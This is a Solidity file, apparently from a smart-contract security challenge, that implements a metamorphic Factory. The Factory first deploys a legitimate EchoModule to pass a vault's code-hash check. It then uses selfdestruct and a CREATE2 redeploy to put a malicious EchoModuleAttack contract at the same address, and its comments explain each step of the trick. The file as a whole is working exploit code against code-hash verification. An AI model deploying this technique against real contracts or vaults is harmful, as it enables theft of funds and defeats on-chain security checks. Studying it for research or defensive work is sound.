// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

import "targets/sentinel/EchoModule.sol";
import "./EchoModuleAttack.sol";

// Interface so Factory can read the phase from its deployer (SentinelAttack)
interface IPhaseProvider {
    function attackPhase() external view returns (bool);
}

/// @notice Metamorphic Factory — deployed via CREATE2, deploys children via CREATE.
///
/// Why CREATE2 for this contract + CREATE for children?
///   - CREATE2 addr = hash(deployer, salt, bytecode) → same Factory bytecode + same salt = same address
///   - CREATE child addr = hash(factory_addr, nonce) → same factory address + nonce=1 = same child address
///   - Different child bytecode at the same address = the whole metamorphic trick
///
/// The Factory has NO constructor args (so its creation bytecode never changes).
/// Instead it reads `attackPhase` from msg.sender (the SentinelAttack contract)
/// to decide which child to deploy.
///
/// Was (original): used constructor bool arg (changed bytecode → different CREATE2 address each time),
/// had typos ("distruct", "retrn"), missing return types, used CREATE2 for children (wrong).
contract Factory {

    /// @notice Deploy the appropriate child contract based on the deployer's phase flag.
    ///         Uses CREATE (not CREATE2) so address = hash(this, nonce).
    ///         Nonce is always 1 (first CREATE after Factory deployment), so same address both times.
    function deploy() external returns (address) {
        // Read phase from the contract that deployed us (SentinelAttack)
        bool isAttack = IPhaseProvider(msg.sender).attackPhase();

        if (!isAttack) {
            // Phase 1: deploy the legit EchoModule (passes the vault's code hash check)
            EchoModule echo = new EchoModule();
            return address(echo);
        } else {
            // Phase 2: deploy malicious contract at the SAME address
            // (Factory is at the same address, nonce=1 again after selfdestruct reset)
            EchoModuleAttack atk = new EchoModuleAttack();
            return address(atk);
        }
    }

    /// @notice Selfdestruct the Factory so it can be redeployed at the same CREATE2 address.
    ///         Nonce resets to 0 when code is cleared, so next deploy() child lands at same address.
    /// Was: called "distruct" (typo)
    function destroy() external {
        selfdestruct(payable(msg.sender));
    }
}
